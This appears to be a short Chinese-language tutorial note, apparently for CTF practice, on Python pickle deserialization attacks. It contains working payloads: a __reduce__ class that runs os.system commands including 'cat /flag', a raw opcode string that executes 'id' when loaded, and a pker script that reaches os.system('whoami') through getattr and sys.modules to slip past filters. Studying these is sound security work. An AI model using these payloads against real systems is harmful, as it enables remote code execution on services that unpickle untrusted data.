---
title: "pickle反序列化"
pubDatetime: 2025-01-20T21:06:41.000+08:00
description: "pickle反序列化"
tags: ["pickle","python"]
---
[文章](https://xz.aliyun.com/news/7032)
[本地版本](assets/pickle反序列化/pickle1.html)

pickle.dumps，pickle.loads相当于python的序列化和反序列化。
```python
import pickle
import os
class tmp():
        text = "123"
        def __reduce__(self):
                return (os.system,("id",)) # return (os.system,("env;ls /;cat /flag",))
text = tmp()
serialized_text = pickle.dumps(text)
print(serialized_text)

reltext = pickle.loads(serialized_text)
print(reltext.text)
```
__这里的__reduce__函数相当于php中的__wakeup__, 参数1是函数，参数2是要传递给该函数的参数。
pickle在反序列化的时候会自动import未import的模块，直接执行。 这里的opcode是上述例子serialized_text

```python
import pickle
pickle.loads(b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.')
```
会自动执行命令。


## pker

```txt
以下module都可以是包含`.`的子module
调用函数时，注意传入的参数类型要和示例一致
对应的opcode会被生成，但并不与pker代码相互等价

GLOBAL
对应opcode：b'c'
获取module下的一个全局对象（没有import的也可以，比如下面的os）：
GLOBAL('os', 'system')
输入：module,instance(callable、module都是instance)  

INST
对应opcode：b'i'
建立并入栈一个对象（可以执行一个函数）：
INST('os', 'system', 'ls')  
输入：module,callable,para 

OBJ
对应opcode：b'o'
建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
OBJ(GLOBAL('os', 'system'), 'ls') 
输入：callable,para

xxx(xx,...)
对应opcode：b'R'
使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[0]=321
或
globals_dic['local_var']='hello'
对应opcode：b's'
更新列表或字典的某项的值

xx.attr=123
对应opcode：b'b'
对xx对象进行属性设置

return
对应opcode：b'0'
出栈（作为pickle.loads函数的返回值）：
return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
```


`getattr(builtins.dict,"get")(sys.modules,"os").system("whoami")`
pker输入
```python
getattr=GLOBAL('builtins','getattr')
dict=GLOBAL('builtins','dict')
get=getattr(dict,'get')
mod=GLOBAL('sys','modules')
os=get(mod,'os')
system=getattr(os,'system')
system("whoami")
return
```
